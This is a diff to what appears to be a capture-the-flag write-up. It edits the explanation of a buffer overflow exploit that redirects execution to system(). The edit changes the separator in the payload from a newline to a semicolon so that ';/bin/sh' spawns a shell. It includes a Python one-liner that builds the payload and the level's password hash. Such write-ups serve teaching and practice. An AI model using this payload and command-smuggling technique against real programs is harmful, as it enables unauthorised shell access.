@@ -37,14 +37,14 @@ print "\xb7\xd8\x60\x60"[::-1] + ("A" * 104) + "\x08\x04\xA0\x0C"[::-1] + "/bin/
 At this point, if we try to execute the program, we can notice that it doesnt work.
 It's because actually the parameter passed to system isn't only "/bin/sh".
 It also contains the address of our sys_address location.
-To avoid that error, we just have to add "\n" in our system parameter, 
+To avoid that error, we just have to add ";" in our system parameter, 
 in order to execute the address as a string, make it fail, and make system execute
-the other command separed by the "\n".
+the other command separed by the ";".
 
-Our new system string param now looks like : "\n/bin/sh"
+Our new system string param now looks like : ";/bin/sh"
 
 Python :
-print "\xb7\xd8\x60\x60"[::-1] + ("A" * 104) + "\x08\x04\xA0\x0C"[::-1] + "\n/bin/sh"
+print "\xb7\xd8\x60\x60"[::-1] + ("A" * 104) + "\x08\x04\xA0\x0C"[::-1] + ";/bin/sh"
 
 pass :
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
